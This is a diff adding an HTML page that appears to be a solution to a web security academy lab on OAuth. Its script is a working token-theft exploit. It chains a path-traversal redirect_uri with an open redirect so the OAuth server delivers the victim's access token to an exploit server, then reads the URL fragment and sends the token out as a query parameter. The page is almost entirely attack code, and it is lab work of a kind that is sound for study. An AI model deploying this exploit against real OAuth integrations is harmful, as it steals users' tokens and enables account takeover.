@@ -1,0 +1,19 @@
+<html>
+  <body>
+    <script>
+      if (window.location.href.includes('exploit-server.net/exploit')) {
+        if (window.location.href.endsWith('exploit')) {
+          window.location.href = "https://oauth-0ad500b104005bca80a215ca02980088.oauth-server.net/auth?client_id=hno1lhhddgh5jxrleolha&redirect_uri=https://0a1700a504595b5a804717ea0081001a.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ad00008043b5b6880e7168401560057.exploit-server.net/exploit&response_type=token&nonce=779006102&scope=openid%20profile%20email";
+        }
+        
+        else if (window.location.href.endsWith('email')) {
+          const fragment = encodeURIComponent(window.location.hash.substring(1));
+          // sessionStorage.setItem('fragment', fragment);
+          window.location.href = `https://exploit-0ad00008043b5b6880e7168401560057.exploit-server.net/?code=${fragment}`;
+        }else {
+          window.location.href = `https://exploit-0ad00008043b5b6880e7168401560057.exploit-server.net/exploit`;
+        }
+      }
+    </script>
+  </body>
+</html>
